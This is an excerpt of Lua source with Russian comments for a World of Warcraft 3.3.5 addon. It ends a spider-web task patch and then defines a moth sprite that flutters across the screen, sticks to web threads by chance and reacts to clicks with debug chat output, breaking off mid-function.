    -- Для обычной паутины после мотылька делаем реальный пересчёт задач.
    --
    -- Не делаем это для:
    -- - кокона;
    -- - moth-кокона;
    -- - порванной паутины.
    -----------------------------------------------------------------------
    if (S.phase == "task" or S.phase == "instanceComplete")
        and S.currentInstance
        and not S.currentInstance.torn
        and not S.currentInstance.isCocoon
        and not S.currentInstance.isMoth then

        local rebuilt = self:NP_RebuildInstanceTasks(S.currentInstance)

        if rebuilt then
            S.tasks = rebuilt
            S.taskIdx = 1
            S.currentTask = nil

            if #rebuilt == 0 then
                S.phase = "instanceComplete"
                S.completeTimer = 0
            else
                S.phase = "task"
            end
        end
    end

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
    end
end

---------------------------------------------------------------------------
-- Обновить BaseMethods, если патч вставлен после инициализации.
---------------------------------------------------------------------------

if type(NSPauk.BaseMethods) == "table" then
    NSPauk.BaseMethods.NP_RebuildInstanceTasks = NSPauk.NP_RebuildInstanceTasks
    NSPauk.BaseMethods.RestoreMothStateImmediate = NSPauk.RestoreMothStateImmediate
end
























































































































































-- NSPauk_Moth.lua
-- Совместимо с WoW 3.3.5 (Interface: 30300)

if NSPauk_Moth then
    return
end

local NSPauk_Moth = {
    inited = false,

    frame = nil,
    tex = nil,

    tex1 = nil,
    tex2 = nil,

    bootstrap = nil,
    timerFrame = nil,

    respawnRemaining = nil,
    respawnAt = nil,

    parentMode = "auto",

    destroyed = false,
    freezeRequested = false,

    stuckInfo = {
        stuck = false,
        x = 0,
        y = 0,
    },

    lastStuckInfo = nil,
    lastWebInfo = nil,

    webRegionsCache = nil,
    webRegionsCacheTime = nil,
    webRegionsCacheWeb = nil,

    cfg = {
        SIZE = 22,
        CLICK_AREA = 30,

        FLAP_FLY = 0.04,
        FLAP_STUCK = 0.06,

        SPEED_MIN = 80,
        SPEED_MAX = 165,

        BURST_SPEED_MIN = 60,
        BURST_SPEED_MAX = 150,

        TURN = 6.0,
        NOISE = 70,

        JERK_MIN = 0.14,
        JERK_MAX = 0.62,

        STICK_DIST = 9,
        CHECK_INTERVAL = 0.035,
        MARGIN = 12,

        STUCK_SPRING = 140,
        STUCK_DAMP = 10,
        STUCK_JERK_MIN = 0.04,
        STUCK_JERK_MAX = 0.18,
        STUCK_JERK_SPEED_MIN = 45,
        STUCK_JERK_SPEED_MAX = 130,
        STUCK_OFFSET_MAX = 5.5,

        DASH_DISTANCE = 50,
        DASH_IMPULSE = 220,
        DASH_IMMUNITY = 0.30,

        DEATH_FADE_TIME = 10,

        STICK_CONNS = true,
        STICK_CROSSSEGS = true,

        DEBUG_WEB_RADIUS = 120,

        STICK_ONLY_VISIBLE_TEXTURE = true,
        STICK_VISIBLE_RADIUS = 6,

        STICK_CHANCE = 1 / 3,
        STICK_FAIL_IMMUNITY_MIN = 0.75,
        STICK_FAIL_IMMUNITY_MAX = 1.50,
        STICK_FAIL_REQUIRE_LEAVE = true,
        STICK_FAIL_IMPULSE_MIN = 90,
        STICK_FAIL_IMPULSE_MAX = 180,

        STICK_KIND_TRAVEL = false,
        STICK_NSPCRAWL = false,
        STICK_NSPNOINSERT = true,
        STICK_NSPDURINGDRAG = true,

        RESPAWN_MIN_SECONDS = 10 * 60,
        RESPAWN_MAX_SECONDS = 30 * 60,
    },

    state = {
        x = 0,
        y = 0,

        vx = 0,
        vy = 0,

        desiredSpeed = 120,
        speedTimer = 0,
        jerkTimer = 0,

        wing = false,
        flapTimer = 0,
        flapInterval = 0.04,

        checkTimer = 0,

        stuckOwner = nil,
        stuckT = 0,

        offX = 0,
        offY = 0,
        twitchVelX = 0,
        twitchVelY = 0,
        twitchTimer = 0,

        dead = false,
        deadTimer = 0,

        clickImmunity = 0,

        webFailUntil = 0,
        webFailActive = false,

        frozen = false,
        destroyed = false,
    },
}

_G.NSPauk_Moth = NSPauk_Moth
_G.NSPauk_Moth_StuckInfo = NSPauk_Moth.stuckInfo

---------------------------------------------------------------------------
-- Локальные хелперы
---------------------------------------------------------------------------

local function HasPoint(p)
    return type(p) == "table"
        and type(p.x) == "number"
        and type(p.y) == "number"
end

local function IsFrameObject(f)
    local t = type(f)

    if t ~= "table" and t ~= "userdata" then
        return false
    end

    return f.IsShown and f.SetPoint and f.GetWidth and true
end

local function FrameLabel(f)
    if f == nil then
        return "nil"
    end

    if not IsFrameObject(f) then
        return tostring(f)
    end

    local name = f.GetName and f:GetName() or nil
    local otype = f.GetObjectType and f:GetObjectType() or "Frame"

    if name then
        return name .. " <" .. otype .. ">"
    end

    return tostring(f) .. " <" .. otype .. ">"
end

local function TrimLower(s)
    s = s or ""
    s = s:gsub("^%s+", "")
    s = s:gsub("%s+$", "")
    return s:lower()
end

local function PointToString(p)
    if type(p) == "table" and type(p.x) == "number" and type(p.y) == "number" then
        return string.format("%.1f,%.1f", p.x, p.y)
    end

    return "invalid"
end

local function AnchorBaseCoords(relPoint, parentW, parentH)
    if relPoint == "BOTTOMLEFT" then
        return 0, 0
    elseif relPoint == "BOTTOM" then
        return parentW / 2, 0
    elseif relPoint == "BOTTOMRIGHT" then
        return parentW, 0
    elseif relPoint == "LEFT" then
        return 0, parentH / 2
    elseif relPoint == "CENTER" then
        return parentW / 2, parentH / 2
    elseif relPoint == "RIGHT" then
        return parentW, parentH / 2
    elseif relPoint == "TOPLEFT" then
        return 0, parentH
    elseif relPoint == "TOP" then
        return parentW / 2, parentH
    elseif relPoint == "TOPRIGHT" then
        return parentW, parentH
    end

    return 0, 0
end

local function RegionPointCenter(point, absX, absY, w, h)
    if point == "CENTER" then
        return absX, absY
    elseif point == "BOTTOMLEFT" then
        return absX + w / 2, absY + h / 2
    elseif point == "BOTTOM" then
        return absX, absY + h / 2
    elseif point == "BOTTOMRIGHT" then
        return absX - w / 2, absY + h / 2
    elseif point == "LEFT" then
        return absX + w / 2, absY
    elseif point == "RIGHT" then
        return absX - w / 2, absY
    elseif point == "TOPLEFT" then
        return absX + w / 2, absY - h / 2
    elseif point == "TOP" then
        return absX, absY - h / 2
    elseif point == "TOPRIGHT" then
        return absX - w / 2, absY - h / 2
    end

    return absX, absY
end

local function Dist2ToSegment(px, py, ax, ay, bx, by)
    local dx = bx - ax
    local dy = by - ay

    local len2 = dx * dx + dy * dy

    if len2 <= 0.0001 then
        local ex = px - ax
        local ey = py - ay
        return ex * ex + ey * ey
    end

    local t = ((px - ax) * dx + (py - ay) * dy) / len2

    if t < 0 then
        t = 0
    elseif t > 1 then
        t = 1
    end

    local cx = ax + t * dx
    local cy = ay + t * dy

    local ex = px - cx
    local ey = py - cy

    return ex * ex + ey * ey
end

local function ClearTableKeep(t, keep)
    if type(t) ~= "table" then
        return
    end

    local keys = {}

    for k in pairs(t) do
        keys[#keys + 1] = k
    end

    for _, k in ipairs(keys) do
        if not (keep and keep[k]) then
            t[k] = nil
        end
    end
end

---------------------------------------------------------------------------
-- Чат
---------------------------------------------------------------------------

function NSPauk_Moth:Print(...)
    local n = select("#", ...)
    local parts = {}

    for i = 1, n do
        parts[i] = tostring(select(i, ...))
    end

    local chat = DEFAULT_CHAT_FRAME or ChatFrame1

    if chat and chat.AddMessage then
        chat:AddMessage("|cff66ccffNSMoth:|r " .. table.concat(parts, " "))
    end
end

---------------------------------------------------------------------------
-- Текстуры
---------------------------------------------------------------------------

function NSPauk_Moth:GetTexturePath(name)
    if type(NSPauk) == "table"
        and type(NSPauk.C) == "table"
        and type(NSPauk.C.TEX_WEB) == "string" then

        local web = NSPauk.C.TEX_WEB

        if #web >= 11 and web:lower():sub(-11) == "pautina.tga" then
            return web:sub(1, #web - 11) .. name
        end
    end

    return "Interface\\AddOns\\NSQC3\\libs\\" .. name
end

---------------------------------------------------------------------------
-- Anchor / parent selection
---------------------------------------------------------------------------

function NSPauk_Moth:GetAnchorFrame()
    local mode = self.parentMode or "auto"

    local web

    if type(NSPauk) == "table" then
        web = NSPauk.F_HIGH

        if type(web) == "string" then
            web = _G[web]
        end
    end

    if not IsFrameObject(web) and IsFrameObject(_G.NSPauk_WebHigh) then
        web = _G.NSPauk_WebHigh
    end

    if mode == "ui" then
        return UIParent
    end

    if mode == "web" then
        if IsFrameObject(web) then
            return web
        end

        return UIParent
    end

    if IsFrameObject(web) then
        local visible = true

        if web.IsVisible then
            visible = web:IsVisible()
        end

        if visible then
            return web
        end
    end

    return UIParent
end

---------------------------------------------------------------------------
-- Размеры экрана / родительского фрейма
---------------------------------------------------------------------------

function NSPauk_Moth:ScreenSize()
    local parent = self:GetAnchorFrame()

    if IsFrameObject(parent) then
        local w = parent:GetWidth()
        local h = parent:GetHeight()

        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end

    if UIParent then
        local w = UIParent:GetWidth()
        local h = UIParent:GetHeight()

        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end

    local sw = GetScreenWidth and GetScreenWidth() or 0
    local sh = GetScreenHeight and GetScreenHeight() or 0

    if sw > 0 and sh > 0 then
        return sw, sh
    end

    return 1, 1
end

---------------------------------------------------------------------------
-- Web frame / regions
---------------------------------------------------------------------------

function NSPauk_Moth:GetWebFrame()
    local web

    if type(NSPauk) == "table" then
        web = NSPauk.F_HIGH

        if type(web) == "string" then
            web = _G[web]
        end
    end

    if not IsFrameObject(web) and IsFrameObject(_G.NSPauk_WebHigh) then
        web = _G.NSPauk_WebHigh
    end

    if IsFrameObject(web) then
        return web
    end

    return nil
end

function NSPauk_Moth:GetWebRegions(web)
    if not IsFrameObject(web) or not web.GetRegions then
        return {}
    end

    local now = GetTime()

    if self.webRegionsCache
        and self.webRegionsCacheWeb == web
        and self.webRegionsCacheTime
        and now - self.webRegionsCacheTime < 0.15 then
        return self.webRegionsCache
    end

    local ok, regions = pcall(function()
        return {web:GetRegions()}
    end)

    if ok and type(regions) == "table" then
        self.webRegionsCache = regions
        self.webRegionsCacheTime = now
        self.webRegionsCacheWeb = web
        return regions
    end

    return {}
end

---------------------------------------------------------------------------
-- Проверка: есть ли видимая текстура паутины рядом с точкой
---------------------------------------------------------------------------

function NSPauk_Moth:HasVisibleWebTextureNear(x, y, radius)
    local web = self:GetWebFrame()

    if not IsFrameObject(web) then
        return false
    end

    local parentW = web.GetWidth and web:GetWidth() or 0
    local parentH = web.GetHeight and web:GetHeight() or 0

    if parentW <= 0 or parentH <= 0 then
        return false
    end

    local regions = self:GetWebRegions(web)

    if not regions or #regions == 0 then
        return false
    end

    local r = radius or self.cfg.STICK_VISIBLE_RADIUS or 26

    for _, reg in ipairs(regions) do
        if reg.GetObjectType and reg:GetObjectType() == "Texture" then
            local shown = true

            if reg.IsShown then
                shown = reg:IsShown()
            end

            local alpha = 1

            if reg.GetAlpha then
                alpha = reg:GetAlpha() or 1
            end

            if shown and alpha > 0.01 then
                local w = reg.GetWidth and reg:GetWidth() or 0
                local h = reg.GetHeight and reg:GetHeight() or 0

                local isFullScreenish = w > parentW * 0.8 and h > parentH * 0.8

                if not isFullScreenish then
                    local pts = {}

                    if reg.GetNumPoints then
                        local n = reg:GetNumPoints()

                        for i = 1, n do
                            local point, relTo, relPoint, ox, oy = reg:GetPoint(i)

                            if ox and oy then
                                local relName = nil

                                if type(relTo) == "string" then
                                    relName = relTo
                                elseif relTo and relTo.GetName then
                                    relName = relTo:GetName()
                                end

                                local okRel = (relTo == nil)
                                    or (relTo == web)
                                    or (relTo == UIParent)
                                    or relName == "NSPauk_WebHigh"
                                    or relName == "UIParent"

                                if okRel then
                                    local baseX, baseY = AnchorBaseCoords(relPoint, parentW, parentH)

                                    pts[#pts + 1] = {
                                        x = baseX + ox,
                                        y = baseY + oy,
                                        point = point,
                                    }
                                end
                            end
                        end
                    end

                    local near = false

                    if #pts == 1 then
                        local cx, cy = RegionPointCenter(pts[1].point, pts[1].x, pts[1].y, w, h)

                        local dx = cx - x
                        local dy = cy - y

                        local rr = r + math.max(w, h) / 2

                        near = (dx * dx + dy * dy) <= (rr * rr)

                    elseif #pts >= 2 then
                        local rr = r + math.min(w, h) / 2 + 8

                        for i = 1, #pts - 1 do
                            local d2 = Dist2ToSegment(
                                x, y,
                                pts[i].x, pts[i].y,
                                pts[i + 1].x, pts[i + 1].y
                            )

                            if d2 <= rr * rr then
                                near = true
                                break
                            end
                        end

                        if not near then
                            local d2 = Dist2ToSegment(
                                x, y,
                                pts[#pts].x, pts[#pts].y,
                                pts[1].x, pts[1].y
                            )

                            if d2 <= rr * rr then
                                near = true
                            end
                        end
                    end

                    if near then
                        return true
                    end
                end
            end
        end
    end

    return false
end

---------------------------------------------------------------------------
-- Создание фрейма
---------------------------------------------------------------------------

function NSPauk_Moth:CreateWidgets()
    if self.frame then
        return
    end

    local cfg = self.cfg
    local parent = self:GetAnchorFrame()

    local frameName = "NSPauk_MothFrame"

    if _G[frameName] then
        frameName = nil
    end

    local f = CreateFrame("Frame", frameName, parent)

    f:SetFrameStrata("TOOLTIP")
    f:SetFrameLevel(103)
    f:SetWidth(cfg.CLICK_AREA)
    f:SetHeight(cfg.CLICK_AREA)
    f:EnableMouse(true)
    f:Hide()

    self.frame = f

    local tex = f:CreateTexture(nil, "OVERLAY")

    tex:SetWidth(cfg.SIZE)
    tex:SetHeight(cfg.SIZE)
    tex:SetPoint("CENTER", f, "CENTER", 0, 0)
    tex:SetDrawLayer("OVERLAY")
    tex:Show()

    self.tex = tex

    self.tex1 = self:GetTexturePath("m1.tga")
    self.tex2 = self:GetTexturePath("m2.tga")

    self:ApplyTexture()

    f:SetScript("OnUpdate", function(_, elapsed)
        NSPauk_Moth:OnUpdate(elapsed)
    end)

    f:SetScript("OnMouseDown", function(_, button)
        NSPauk_Moth:OnClick(button)
    end)
end

---------------------------------------------------------------------------
-- Внешний вид
---------------------------------------------------------------------------

function NSPauk_Moth:ApplyTexture()
    if not self.tex
        or not self.frame
        or self.destroyed
        or (self.state and self.state.frozen) then
        return
    end

    local cfg = self.cfg

    self.tex:ClearAllPoints()
    self.tex:SetWidth(cfg.SIZE)
    self.tex:SetHeight(cfg.SIZE)
    self.tex:SetPoint("CENTER", self.frame, "CENTER", 0, 0)
    self.tex:SetBlendMode("BLEND")
    self.tex:SetAlpha(1)
    self.tex:SetVertexColor(1, 1, 1, 1)

    self.tex:SetTexture(self.state.wing and self.tex2 or self.tex1)

    self.tex:Show()
end

function NSPauk_Moth:SetWing(w)
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    self.state.wing = w
    self:ApplyTexture()
end

function NSPauk_Moth:Place()
    if not self.frame or self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local parent = self:GetAnchorFrame()

    if IsFrameObject(parent) and self.frame:GetParent() ~= parent then
        self.frame:SetParent(parent)
        self.frame:SetFrameStrata("TOOLTIP")
        self.frame:SetFrameLevel(103)
    end

    self.frame:ClearAllPoints()
    self.frame:SetPoint("CENTER", parent, "BOTTOMLEFT", self.state.x, self.state.y)

    self:UpdateStuckInfo()
end

---------------------------------------------------------------------------
-- Паутина из NSPauk
---------------------------------------------------------------------------

function NSPauk_Moth:ThreadIsValid(thread)
    if type(thread) ~= "table" then
        return false
    end

    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return false
    end

    local dx = p2.x - p0.x
    local dy = p2.y - p0.y

    return (dx * dx + dy * dy) > 1.0
end

function NSPauk_Moth:ThreadPointAt(thread, t)
    if type(thread) ~= "table" then
        return 0, 0
    end

    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return 0, 0
    end

    local p1 = thread.p1

    if not HasPoint(p1) then
        p1 = {
            x = (p0.x + p2.x) / 2,
            y = (p0.y + p2.y) / 2,
        }
    end

    local m = 1 - t

    return m * m * p0.x + 2 * m * t * p1.x + t * t * p2.x,
           m * m * p0.y + 2 * m * t * p1.y + t * t * p2.y
end

function NSPauk_Moth:ThreadNearBox(thread, x, y, pad)
    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return false
    end

    local minX = p0.x
    local maxX = p0.x
    local minY = p0.y
    local maxY = p0.y

    local p1 = thread.p1

    if HasPoint(p1) then
        if p1.x < minX then minX = p1.x end
        if p1.x > maxX then maxX = p1.x end
        if p1.y < minY then minY = p1.y end
        if p1.y > maxY then maxY = p1.y end
    end

    if p2.x < minX then minX = p2.x end
    if p2.x > maxX then maxX = p2.x end
    if p2.y < minY then minY = p2.y end
    if p2.y > maxY then maxY = p2.y end

    return x >= minX - pad
        and x <= maxX + pad
        and y >= minY - pad
        and y <= maxY + pad
end

function NSPauk_Moth:NearestThreadT(thread, x, y)
    local bestT = 0
    local bestD2 = math.huge

    for i = 0, 16 do
        local t = i / 16
        local px, py = self:ThreadPointAt(thread, t)

        local dx = px - x
        local dy = py - y
        local d2 = dx * dx + dy * dy

        if d2 < bestD2 then
            bestD2 = d2
            bestT = t
        end
    end

    return bestT, bestD2
end

---------------------------------------------------------------------------
-- Фильтр служебных / нежелательных сегментов
---------------------------------------------------------------------------

function NSPauk_Moth:IsStickyTarget(obj, thread)
    local allowTravel = self.cfg.STICK_KIND_TRAVEL == true
    local allowCrawl = self.cfg.STICK_NSPCRAWL == true
    local allowNoInsert = self.cfg.STICK_NSPNOINSERT ~= false
    local allowDuringDrag = self.cfg.STICK_NSPDURINGDRAG ~= false

    local function checkOne(tbl)
        if type(tbl) ~= "table" then
            return true
        end

        if tbl.kind == "travel" and not allowTravel then
            return false
        end

        if tbl.nspCrawl == true and not allowCrawl then
            return false
        end

        if tbl.nspNoInsert == true and not allowNoInsert then
            return false
        end

        if tbl.nspDuringDrag == true and not allowDuringDrag then
            return false
        end

        return true
    end

    if not checkOne(obj) then
        return false
    end

    if not checkOne(thread) then
        return false
    end

    if type(thread) == "table" then
        local n = 0

        for _, v in pairs(thread) do
            if type(v) == "table" then
                n = n + 1

                if n > 160 then
                    break
                end

                if not checkOne(v) then
                    return false
                end
            end
        end
    end

    return true
end

---------------------------------------------------------------------------
-- Шанс прилипания
---------------------------------------------------------------------------

function NSPauk_Moth:RollStickChance()
    local chance = self.cfg.STICK_CHANCE

    if chance == nil then
        chance = 1 / 3
    end

    if chance <= 0 then
        return false
    end

    if chance >= 1 then
        return true
    end

    return math.random() < chance
end

---------------------------------------------------------------------------
-- Рывок, если не увяз
---------------------------------------------------------------------------

function NSPauk_Moth:WebEscapeImpulse()
    local s = self.state

    if not s or s.dead or s.stuckOwner then
        return
    end

    local vx = s.vx or 0
    local vy = s.vy or 0

    local speed = math.sqrt(vx * vx + vy * vy)
    local angle

    if speed > 1 then
        angle = math.atan2(vy, vx)
    else
        angle = math.random() * 2 * math.pi
    end

    local side = (math.random() < 0.5) and -1 or 1
    local offset = side * (math.pi / 3 + math.random() * math.pi / 3)

    local impMin = self.cfg.STICK_FAIL_IMPULSE_MIN or 90
    local impMax = self.cfg.STICK_FAIL_IMPULSE_MAX or 180

    if impMax < impMin then
        impMax = impMin
    end

    local imp = impMin + math.random() * (impMax - impMin)

    s.vx = vx + math.cos(angle + offset) * imp
    s.vy = vy + math.sin(angle + offset) * imp
end

---------------------------------------------------------------------------
-- Поиск паутины с шансом, фильтрами и проверкой видимой текстуры
---------------------------------------------------------------------------

function NSPauk_Moth:FindWeb(x, y)
    self.lastWebInfo = nil

    if self.destroyed or (self.state and self.state.frozen) then
        return nil
    end

    if type(NSPauk) ~= "table" then
        return nil
    end

    local S = NSPauk.S

    if type(S) ~= "table" or type(S.instances) ~= "table" then
        return nil
    end

    local stick2 = self.cfg.STICK_DIST * self.cfg.STICK_DIST
    local pad = self.cfg.STICK_DIST + 4

    local allowConns = self.cfg.STICK_CONNS ~= false
    local allowCrossSegs = self.cfg.STICK_CROSSSEGS ~= false

    local bestOwner = nil
    local bestT = 0
    local bestD2 = math.huge
    local bestSource = nil
    local bestInst = nil
    local bestIndex = nil

    local function consider(source, instIndex, index, obj)
        if type(obj) == "table"
            and obj.alive
            and obj.hidden ~= true
            and obj.visible ~= false
            and self:ThreadIsValid(obj.thread)
            and self:IsStickyTarget(obj, obj.thread) then

            if self:ThreadNearBox(obj.thread, x, y, pad) then
                local t, d2 = self:NearestThreadT(obj.thread, x, y)

                if d2 <= stick2 and d2 < bestD2 then
                    bestOwner = obj
                    bestT = t
                    bestD2 = d2
                    bestSource = source
                    bestInst = instIndex
                    bestIndex = index
                end
            end
        end
    end

    for instIndex, inst in pairs(S.instances) do
        if type(inst) == "table"
            and inst.alive ~= false
            and inst.hidden ~= true
            and inst.visible ~= false then

            if allowConns and type(inst.conns) == "table" then
                for connIndex, conn in pairs(inst.conns) do
                    consider("conns", instIndex, connIndex, conn)
                end
            end

            if allowCrossSegs and type(inst.crossSegs) == "table" then
                for segIndex, seg in pairs(inst.crossSegs) do
                    consider("crossSegs", instIndex, segIndex, seg)
                end
            end
        end
    end

    local s = self.state
    local now = GetTime and GetTime() or 0

    if not bestOwner then
        if now >= (s.webFailUntil or 0) then
            s.webFailActive = false
        end

        return nil
    end

    local baseX, baseY = self:ThreadPointAt(bestOwner.thread, bestT)

    local visible = true
    local checkVisibleTexture = self.cfg.STICK_ONLY_VISIBLE_TEXTURE ~= false

    if checkVisibleTexture and self.HasVisibleWebTextureNear then
        local radius = self.cfg.STICK_VISIBLE_RADIUS or 26

        local okVisible, visibleTexture = pcall(function()
            return self:HasVisibleWebTextureNear(baseX, baseY, radius)
        end)

        visible = okVisible and visibleTexture or false
    end

    local info = {
        source = bestSource,
        inst = bestInst,
        index = bestIndex,
        t = bestT,
        dist = math.sqrt(bestD2),
        baseX = baseX,
        baseY = baseY,
        visibleTexture = visible,
        rejected = nil,
    }

    self.lastWebInfo = info

    if checkVisibleTexture and not visible then
        info.rejected = "no visible texture"

        if now >= (s.webFailUntil or 0) then
            s.webFailActive = false
        end

        return nil
    end

    if s.webFailActive then
        local requireLeave = self.cfg.STICK_FAIL_REQUIRE_LEAVE ~= false

        if requireLeave then
            info.rejected = "chance fail: leave web first"
            return nil
        else
            if now < (s.webFailUntil or 0) then
                info.rejected = "chance cooldown"
                return nil
            end

            s.webFailActive = false
        end
    end

    if self:RollStickChance() then
        s.webFailActive = false
        s.webFailUntil = 0

        return bestOwner, bestT
    end

    local min = self.cfg.STICK_FAIL_IMMUNITY_MIN or 0.75
    local max = self.cfg.STICK_FAIL_IMMUNITY_MAX or 1.50

    if max < min then
        max = min
    end

    s.webFailActive = true
    s.webFailUntil = now + min + math.random() * (max - min)

    info.rejected = "chance fail"

    self:WebEscapeImpulse()

    return nil
end

---------------------------------------------------------------------------
-- Движение
---------------------------------------------------------------------------

function NSPauk_Moth:KickOff()
    local s = self.state
    local cfg = self.cfg

    local angle = math.random() * 2 * math.pi
    local speed = cfg.SPEED_MIN + math.random() * (cfg.SPEED_MAX - cfg.SPEED_MIN)

    s.vx = math.cos(angle) * speed
    s.vy = math.sin(angle) * speed

    s.desiredSpeed = speed
    s.speedTimer = 0.30 + math.random() * 0.95
    s.jerkTimer = cfg.JERK_MIN + math.random() * (cfg.JERK_MAX - cfg.JERK_MIN)
end

function NSPauk_Moth:Release()
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local s = self.state
    local cfg = self.cfg

    s.stuckOwner = nil
    s.stuckT = 0

    s.offX = 0
    s.offY = 0
    s.twitchVelX = 0
    s.twitchVelY = 0
    s.twitchTimer = 0

    self:KickOff()

    s.flapInterval = cfg.FLAP_FLY * (0.65 + math.random() * 0.70)

    s.webFailActive = false
    s.webFailUntil = 0

    self:UpdateStuckInfo()
end

---------------------------------------------------------------------------
-- Клик: уничтожение / рывок
---------------------------------------------------------------------------

function NSPauk_Moth:Kill()
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local s = self.state

    if not s or s.dead then
        return
    end

    s.dead = true
    s.deadTimer = 0

    s.stuckOwner = nil
    s.vx = 0
    s.vy = 0

    if self.frame then
        self.frame:EnableMouse(false)
    end

    if self.tex then
        self.tex:SetAlpha(1)
    end

    self:UpdateStuckInfo()
end

function NSPauk_Moth:DashSideways()
    if self.destroyed or not self.state or self.state.dead or self.state.frozen then
        return
    end

    local s = self.state
    local cfg = self.cfg

    if s.stuckOwner then
        self:Release()
    end

    local speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
    local angle

    if speed > 1 then
        angle = math.atan2(s.vy, s.vx)
    else
        angle = math.random() * 2 * math.pi
    end

    local side = (math.random() < 0.5) and -1 or 1
    local sideAngle = angle + side * math.pi / 2

    local dx = math.cos(sideAngle) * cfg.DASH_DISTANCE
    local dy = math.sin(sideAngle) * cfg.DASH_DISTANCE

    s.x = s.x + dx
    s.y = s.y + dy

    local sw, sh = self:ScreenSize()

    if s.x < cfg.MARGIN then
        s.x = cfg.MARGIN
    elseif s.x > sw - cfg.MARGIN then
        s.x = sw - cfg.MARGIN
    end

    if s.y < cfg.MARGIN then
        s.y = cfg.MARGIN
    elseif s.y > sh - cfg.MARGIN then
        s.y = sh - cfg.MARGIN
    end

    s.vx = s.vx + math.cos(sideAngle) * cfg.DASH_IMPULSE
    s.vy = s.vy + math.sin(sideAngle) * cfg.DASH_IMPULSE

    s.desiredSpeed = cfg.SPEED_MAX
    s.speedTimer = 0.35 + math.random() * 0.45
    s.jerkTimer = math.min(s.jerkTimer or 0, 0.12)

    s.clickImmunity = cfg.DASH_IMMUNITY

    self:Place()
    self:UpdateStuckInfo()
end

function NSPauk_Moth:OnClick(button)
    if not self.inited
        or self.destroyed
        or not self.state
        or self.state.dead
        or self.state.frozen then
        return
    end

    if button and button ~= "LeftButton" then
        return
    end

    if math.random() < 0.10 then
        self:Kill()
    else
        self:DashSideways()
    end
end

---------------------------------------------------------------------------
-- Публичная информация о прилипании
---------------------------------------------------------------------------

function NSPauk_Moth:UpdateStuckInfo()
    if not self.state then
        return
    end

    local s = self.state

    local info = self.stuckInfo or {}

    info.x = s.x
    info.y = s.y
    info.dead = s.dead

    local owner = s.stuckOwner

    if owner
        and owner.alive
        and type(owner.thread) == "table"
        and self:ThreadIsValid(owner.thread) then

        local baseX, baseY = self:ThreadPointAt(owner.thread, s.stuckT)

        info.stuck = true

        info.owner = owner
        info.thread = owner.thread

        info.t = s.stuckT

        info.baseX = baseX
        info.baseY = baseY

        info.p0x = owner.thread.p0.x
        info.p0y = owner.thread.p0.y

        info.p2x = owner.thread.p2.x
        info.p2y = owner.thread.p2.y

        local p1 = owner.thread.p1

        if type(p1) == "table"
            and type(p1.x) == "number"
            and type(p1.y) == "number" then
            info.p1x = p1.x
            info.p1y = p1.y
        else
            info.p1x = nil
            info.p1y = nil
        end

        if self.lastWebInfo then
            info.source = self.lastWebInfo.source
            info.inst = self.lastWebInfo.inst
            info.index = self.lastWebInfo.index
            info.webDist = self.lastWebInfo.dist
            info.visibleTexture = self.lastWebInfo.visibleTexture
            info.rejected = self.lastWebInfo.rejected
        else
            info.source = nil
            info.inst = nil
            info.index = nil
            info.webDist = nil
            info.visibleTexture = nil
            info.rejected = nil
        end

        info.time = GetTime()
        info.firstStuckTime = info.firstStuckTime or info.time

        self.stuckInfo = info

        local last = self.lastStuckInfo or {}

        for k, v in pairs(info) do
            last[k] = v
        end

        last.lastSeenTime = info.time

        self.lastStuckInfo = last
    else
        info.stuck = false

        info.owner = nil
        info.thread = nil

        info.t = nil

        info.baseX = nil
        info.baseY = nil

        info.p0x = nil
        info.p0y = nil
        info.p1x = nil
        info.p1y = nil
        info.p2x = nil
        info.p2y = nil

        info.source = nil
        info.inst = nil
        info.index = nil
        info.webDist = nil
        info.visibleTexture = nil
        info.rejected = nil

        info.firstStuckTime = nil

        self.stuckInfo = info
    end

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo
end

function NSPauk_Moth:PrintStuckInfo()
    local i = self.stuckInfo

    if not i then
        self:Print("stuckInfo = nil")
        return
    end

    if i.stuck then
        self:Print("=== STUCK ===")

        self:Print(
            "pos=", string.format("%.1f,%.1f", i.x or 0, i.y or 0),
            "base=", string.format("%.1f,%.1f", i.baseX or 0, i.baseY or 0),
            "t=", string.format("%.3f", i.t or 0)
        )

        self:Print(
            "owner=", tostring(i.owner),
            "thread=", tostring(i.thread)
        )

        self:Print(
            "source=", tostring(i.source),
            "inst=", tostring(i.inst),
            "index=", tostring(i.index)
        )

        self:Print(
            "visibleTexture=", tostring(i.visibleTexture),
            "webDist=", tostring(i.webDist and string.format("%.2f", i.webDist) or nil)
        )

        self:Print(
            "p0=", string.format("%.1f,%.1f", i.p0x or 0, i.p0y or 0),
            "p2=", string.format("%.1f,%.1f", i.p2x or 0, i.p2y or 0)
        )

        if i.p1x and i.p1y then
            self:Print(
                "p1=", string.format("%.1f,%.1f", i.p1x, i.p1y)
            )
        end

        if i.time then
            self:Print("time=", string.format("%.2f", i.time))
        end
    else
        self:Print(
            "not stuck; current pos=",
            string.format("%.1f,%.1f", i.x or 0, i.y or 0),
            "dead=", tostring(i.dead)
        )
    end

    local last = self.lastStuckInfo

    if last and last.stuck then
        self:Print(
            "last stuck base=",
            string.format("%.1f,%.1f", last.baseX or 0, last.baseY or 0),
            "owner=", tostring(last.owner),
            "source=", tostring(last.source),
            "visibleTexture=", tostring(last.visibleTexture)
        )
    end
end

function NSPauk_Moth:DumpObjectKeys(obj, label, max)
    max = max or 25

    local t = type(obj)

    if t ~= "table" and t ~= "userdata" then
        self:Print(label, "is", t, tostring(obj))
        return
    end

    local keys = {}

    local ok = pcall(function()
        for k in pairs(obj) do
            keys[#keys + 1] = k
        end
    end)

    if not ok then
        self:Print(label, "cannot enumerate keys")
        return
    end

    table.sort(keys, function(a, b)
        return tostring(a) < tostring(b)
    end)

    local shown = 0

    for _, k in ipairs(keys) do
        shown = shown + 1

        if shown > max then
            break
        end

        local v = obj[k]
        local vt = type(v)
        local vs

        if vt == "table" or vt == "userdata" then
